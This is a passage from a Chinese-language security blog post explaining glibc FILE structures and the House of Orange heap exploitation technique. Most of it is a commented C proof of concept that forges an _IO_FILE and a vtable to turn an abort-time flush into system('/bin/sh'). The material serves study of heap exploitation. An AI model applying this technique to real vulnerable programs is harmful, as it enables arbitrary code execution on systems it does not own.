<span class="cp">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span>
<span class="cp">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span>
</pre></div>

<p>相关的结构体<code>_IO_FILE_plus</code>、<code>_IO_FILE</code>、</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>       <span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>   <span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>   <span class="cm">/* End of get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>  <span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span> <span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>  <span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>  <span class="cm">/* End of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>   <span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>    <span class="cm">/* End of reserve area. */</span>
  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
  <span class="n">_IO_off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad1</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad2</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad3</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__pad4</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don&#39;t get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="p">};</span>
<span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="p">{</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
      <span class="cm">/* showmany */</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
      <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
    <span class="p">};</span>
</pre></div>

<p>综合上面的信息，可以看出<code>_IO_OVERFLOW</code>函数实际上就是取得了<code>_IO_list_all</code>指针，然后得到了<code>vtable</code>的地址，随后取得<code>vtable</code>中第4个地址，然后跳转过去。</p>
<p>因此只要我们可以复写<code>_IO_list_all</code>指针、伪造一个<code>_IO_list_all</code>结构，并且重写<code>vatble</code>的第4个地址为<code>system</code>，就可以命令执行了。</p>
<p>复写<code>_IO_list_all</code>指针可以使用<code>Unsorted Bin Attack</code>，使得<code>_IO_list_all</code>可以指向<code>unsorted_chunks (av)</code>，但是此时的为<code>vatble</code>指向的是<code>bins</code>，这里我们需要使用<code>_IO_flush_all_lockp</code>函数中的<code>fp = fp-&gt;_chain;</code>操作更新<code>fp</code>的值，这里<code>fp-&gt;_chain</code>位于偏移0x68，因此需要合理布局unsorted chunk的大小，使之在回收的时候能进入位于0x68偏移处的smallbin，也即大小为0x60的smallbin</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="cm">/*</span>
<span class="cm">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span>
<span class="cm">  It requires a leak of the heap and the libc</span>
<span class="cm">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span>
<span class="cm">*/</span>

<span class="cm">/*</span>
<span class="cm">   This function is just present to emulate the scenario where</span>
<span class="cm">   the address of the function system is known.</span>
<span class="cm">*/</span>
<span class="kt">int</span> <span class="nf">winner</span> <span class="p">(</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/*</span>
<span class="cm">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span>
<span class="cm">      using which the Top (also called the Wilderness) chunk can be corrupted.</span>

<span class="cm">      At the beginning of execution, the entire heap is part of the Top chunk.</span>
<span class="cm">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span>
<span class="cm">      Thus, with every allocation, the Top chunks keeps getting smaller.</span>
<span class="cm">      And in a situation where the size of the Top chunk is smaller than the requested value,</span>
<span class="cm">      there are two possibilities:</span>
<span class="cm">       1) Extend the Top chunk</span>
<span class="cm">       2) Mmap a new page</span>

<span class="cm">      If the size requested is smaller than 0x21000, then the former is followed.</span>
<span class="cm">    */</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">p1</span><span class="p">,</span> <span class="o">*</span><span class="n">p2</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">io_list_all</span><span class="p">,</span> <span class="o">*</span><span class="n">top</span><span class="p">;</span>

    <span class="cm">/*</span>
<span class="cm">      Firstly, lets allocate a chunk on the heap.</span>
<span class="cm">    */</span>

    <span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span>

    <span class="cm">/*</span>
<span class="cm">       The heap is usually allocated with a top chunk of size 0x21000</span>
<span class="cm">       Since we&#39;ve allocate a chunk of size 0x400 already,</span>
<span class="cm">       what&#39;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span>

<span class="cm">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span>
<span class="cm">       it must also be page aligned at the end.</span>

<span class="cm">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span>
<span class="cm">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span>

<span class="cm">       So that means that there are two conditions that must always be true.</span>
<span class="cm">        1) Top chunk + size has to be page aligned</span>
<span class="cm">        2) Top chunk&#39;s prev_inuse bit has to be set.</span>

<span class="cm">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span>
<span class="cm">       What&#39;s left is 0x20c01</span>

<span class="cm">       Now, let&#39;s satisfy the conditions</span>
<span class="cm">       1) Top chunk + size has to be page aligned</span>
<span class="cm">       2) Top chunk&#39;s prev_inuse bit has to be set.</span>
<span class="cm">    */</span>

    <span class="n">top</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">p1</span> <span class="o">+</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mi">16</span><span class="p">);</span>
    <span class="n">top</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc01</span><span class="p">;</span>

    <span class="cm">/* </span>
<span class="cm">       Now we request a chunk of size larger than the size of the Top chunk.</span>
<span class="cm">       Malloc tries to service this request by extending the Top chunk</span>
<span class="cm">       This forces sysmalloc to be invoked.</span>

<span class="cm">       In the usual scenario, the heap looks like the following</span>
<span class="cm">          |------------|------------|------...----|</span>
<span class="cm">          |    chunk   |    chunk   | Top  ...    |</span>
<span class="cm">          |------------|------------|------...----|</span>
<span class="cm">      heap start                              heap end</span>

<span class="cm">       And the new area that gets allocated is contiguous to the old heap end.</span>
<span class="cm">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span>

<span class="cm">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span>
<span class="cm">       which is basically a temporary chunk.</span>

<span class="cm">       After the size of the Top chunk has been updated, this chunk gets freed.</span>

<span class="cm">       In our scenario however, the heap looks like</span>
<span class="cm">          |------------|------------|------..--|--...--|---------|</span>
<span class="cm">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span>
<span class="cm">          |------------|------------|------..--|--...--|---------|</span>
<span class="cm">     heap start                            heap end</span>

<span class="cm">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span>
<span class="cm">       So the area between the second chunk and the heap end is unused.</span>
<span class="cm">       And the old Top chunk gets freed.</span>
<span class="cm">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span>
<span class="cm">       it gets added to list of unsorted bins.</span>
<span class="cm">       Now we request a chunk of size larger than the size of the top chunk.</span>
<span class="cm">       This forces sysmalloc to be invoked.</span>
<span class="cm">       And ultimately invokes _int_free</span>

<span class="cm">       Finally the heap looks like this:</span>
<span class="cm">          |------------|------------|------..--|--...--|---------|</span>
<span class="cm">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span>
<span class="cm">          |------------|------------|------..--|--...--|---------|</span>
<span class="cm">     heap start                                             new heap end</span>



<span class="cm">    */</span>

    <span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="cm">/*</span>
<span class="cm">      Note that the above chunk will be allocated in a different page</span>
<span class="cm">      that gets mmapped. It will be placed after the old heap&#39;s end</span>

<span class="cm">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span>


<span class="cm">      Here starts phase two of the attack. We assume that we have an overflow into the old</span>
<span class="cm">      top chunk so we could overwrite the chunk&#39;s size.</span>
<span class="cm">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span>
<span class="cm">      of this chunk in the unsorted bin list.</span>
<span class="cm">      There are two common ways to exploit the current state:</span>
<span class="cm">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span>
<span class="cm">        - Use the unlinking of the chunk for an *where*-controlled write of the</span>
<span class="cm">          libc&#39;s main_arena unsorted-bin-list. (requires at least one allocation)</span>

<span class="cm">      The former attack is pretty straight forward to exploit, so we will only elaborate</span>
<span class="cm">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span>

<span class="cm">      The attack is pretty stunning, as it exploits the abort call itself, which</span>
<span class="cm">      is triggered when the libc detects any bogus state of the heap.</span>
<span class="cm">      Whenever abort is triggered, it will flush all the file pointers by calling</span>
<span class="cm">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span>
<span class="cm">      _IO_list_all and calling _IO_OVERFLOW on them.</span>

<span class="cm">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span>
<span class="cm">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#39;/bin/sh&#39;, so</span>
<span class="cm">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#39;/bin/sh&#39;).</span>
<span class="cm">      More about file-pointer exploitation can be found here:</span>
<span class="cm">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span>

<span class="cm">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span>
<span class="cm">      currently point to the libc&#39;s main_arena.</span>
<span class="cm">    */</span>

    <span class="n">io_list_all</span> <span class="o">=</span> <span class="n">top</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x9a8</span><span class="p">;</span>

    <span class="cm">/*</span>
<span class="cm">      We plan to overwrite the fd and bk pointers of the old top,</span>
<span class="cm">      which has now been added to the unsorted bins.</span>

<span class="cm">      When malloc tries to satisfy a request by splitting this free chunk</span>
<span class="cm">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span>
<span class="cm">      in libc&#39;s main_arena.</span>

<span class="cm">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span>
<span class="cm">      case.</span>

<span class="cm">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span>
<span class="cm">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span>
<span class="cm">    */</span>

    <span class="n">top</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">io_list_all</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>

    <span class="cm">/*</span>
<span class="cm">      At the end, the system function will be invoked with the pointer to this file pointer.</span>
<span class="cm">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span>
<span class="cm">    */</span>

    <span class="n">memcpy</span><span class="p">(</span> <span class="p">(</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">top</span><span class="p">,</span> <span class="s">&quot;/bin/sh</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="cm">/*</span>
<span class="cm">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span>
<span class="cm">      in _IO_list_all.</span>
<span class="cm">      Since we can only overwrite this address with main_arena&#39;s unsorted-bin-list,</span>
<span class="cm">      the idea is to get control over the memory at the corresponding fd-ptr.</span>
<span class="cm">      The address of the next file pointer is located at base_address+0x68.</span>
<span class="cm">      This corresponds to smallbin-4, which holds all the smallbins of</span>
<span class="cm">      sizes between 90 and 98. For further information about the libc&#39;s bin organisation</span>
<span class="cm">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span>

<span class="cm">      Since we overflow the old top chunk, we also control it&#39;s size field.</span>
<span class="cm">      Here it gets a little bit tricky, currently the old top chunk is in the</span>
<span class="cm">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span>
<span class="cm">      in this list first, therefore, iterates over the list.</span>
<span class="cm">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span>
<span class="cm">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span>
<span class="cm">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span>
<span class="cm">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span>
<span class="cm">      therefore, occupying the smallbin[4] location in the main_arena and</span>
<span class="cm">      eventually representing the fake file pointer&#39;s fd-ptr.</span>

<span class="cm">      In addition to sorting, malloc will also perform certain size checks on them,</span>
<span class="cm">      so after sorting the old top chunk and following the bogus fd pointer</span>
<span class="cm">      to _IO_list_all, it will check the corresponding size field, detect</span>
<span class="cm">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span>
<span class="cm">      and finally triggering the abort call that gets our chain rolling.</span>
<span class="cm">      Here is the corresponding code in the libc:</span>
<span class="cm">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span>
<span class="cm">    */</span>

    <span class="n">top</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x61</span><span class="p">;</span>

    <span class="cm">/*</span>
<span class="cm">      Now comes the part where we satisfy the constraints on the fake file pointer</span>
<span class="cm">      required by the function _IO_flush_all_lockp and tested here:</span>
<span class="cm">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span>

<span class="cm">      We want to satisfy the first condition:</span>
<span class="cm">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span>
<span class="cm">    */</span>

    <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">top</span><span class="p">;</span>


    <span class="cm">/*</span>
<span class="cm">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span>
<span class="cm">    */</span>

    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// top+0xc0</span>


    <span class="cm">/*</span>
<span class="cm">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span>
<span class="cm">    */</span>

    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// top+0x20</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">3</span><span class="p">;</span> <span class="c1">// top+0x28</span>


    <span class="cm">/*</span>
<span class="cm">      4) Finally set the jump table to controlled memory and place system there.</span>
<span class="cm">      The jump table pointer is right after the _IO_FILE struct:</span>
<span class="cm">      base_address+sizeof(_IO_FILE) = jump_table</span>

<span class="cm">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span>
<span class="cm">    */</span>

    <span class="kt">size_t</span> <span class="o">*</span><span class="n">jump_table</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">top</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span> <span class="c1">// controlled memory</span>
    <span class="n">jump_table</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">winner</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">fp</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_IO_FILE</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">jump_table</span><span class="p">;</span> <span class="c1">// top+0xd8</span>


    <span class="cm">/* Finally, trigger the whole chain by calling malloc */</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>

   <span class="cm">/*</span>
<span class="cm">     The libc&#39;s error message will be printed to the screen</span>
<span class="cm">     But you&#39;ll get a shell anyways.</span>
<span class="cm">   */</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">winner</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
<span class="p">{</span> 
    <span class="n">system</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<!-- /content -->
      <footer>
        <p>Posted by <a href="https://alset0326.github.io/author/alset0326.html">Alset0326</a> on <time datetime="2018-03-26T21:31:10.349398+08:00">一 26 三月 2018</time> in <a href="https://alset0326.github.io/category/pwn.html">pwn</a>. <span class="m-label m-success">updated <time datetime="2018-03-26T21:31:10.349398+08:00">一 26 三月 2018</time></span> Tags: <a href="https://alset0326.github.io/tag/linux.html">linux</a>, <a href="https://alset0326.github.io/tag/heap.html">heap</a>, <a href="https://alset0326.github.io/tag/pwn.html">pwn</a>.</p>
      </footer>
    </article>
    <nav class="m-navpanel m-col-m-2">
      <h3>Categories</h3>
      <ol class="m-block-bar-m">
        <li><a href="https://alset0326.github.io/category/android.html">android</a></li>
        <li><a href="https://alset0326.github.io/category/linux.html">linux</a></li>
        <li><a href="https://alset0326.github.io/category/pwn.html">pwn</a></li>
        <li><a href="https://alset0326.github.io/category/python.html">python</a></li>
      </ol>
      <h3>Tag cloud</h3>
      <ul class="m-tagcloud">
        <li class="m-tag-2"><a href="https://alset0326.github.io/tag/android.html">android</a></li>
        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/aosp.html">aosp</a></li>
        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/heap.html">heap</a></li>
        <li class="m-tag-5"><a href="https://alset0326.github.io/tag/linux.html">linux</a></li>
        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/patch.html">patch</a></li>
        <li class="m-tag-5"><a href="https://alset0326.github.io/tag/pwn.html">pwn</a></li>
        <li class="m-tag-2"><a href="https://alset0326.github.io/tag/python.html">python</a></li>
        <li class="m-tag-1"><a href="https://alset0326.github.io/tag/stack.html">stack</a></li>
      </ul>
    </nav>
  </div>
</div>
</main>
<footer><nav>
  <div class="m-container">
    <div class="m-row">
      <div class="m-col-s-3 m-col-t-6">
        <h3><a href="https://github.com/alset0326?tab=repositories">Projects</a></h3>
        <ul>
          <li><a href="https://github.com/alset0326/peda-arm">peda-arm</a></li>
          <li><a href="https://github.com/alset0326/zio3">zio3</a></li>
        </ul>
      </div>
      <div class="m-col-s-3 m-col-t-6">
        <h3><a href="https://alset0326.github.io/">Author</a></h3>
        <ul>
          <li><a href="http://127.0.0.1:8000/author/alset0326.html">Alset0326</a></li>
        </ul>
      </div>
      <div class="m-clearfix-t"></div>
      <div class="m-col-s-3 m-col-t-6">
        <h3><a href="https://github.com/alset0326">Contact</a></h3>
        <ul>
          <li><a href="https://alset0326.github.io/alset0326@gmail.com">E-mail</a></li>
          <li><a href="https://github.com/alset0326">GitHub</a></li>
        </ul>
      </div>
      <div class="m-col-s-3 m-col-t-6">
        <h3><a href="https://alset0326.github.io/">Blog</a></h3>
        <ul>
          <li><a href="https://alset0326.github.io/category/android.html">android</a></li>
          <li><a href="https://alset0326.github.io/category/linux.html">linux</a></li>
          <li><a href="https://alset0326.github.io/category/pwn.html">pwn</a></li>
          <li><a href="https://alset0326.github.io/category/python.html">python</a></li>
        </ul>
      </div>
    </div>
    <div class="m-row">
      <div class="m-col-l-10 m-push-l-1">
        <p>A-NOTES. Powered by <a href="https://getpelican.com">Pelican</a> and <a href="http://mcss.mosra.cz">m.css</a>.</p>
      </div>
    </div>
  </div>
</nav></footer>
</body>
</html>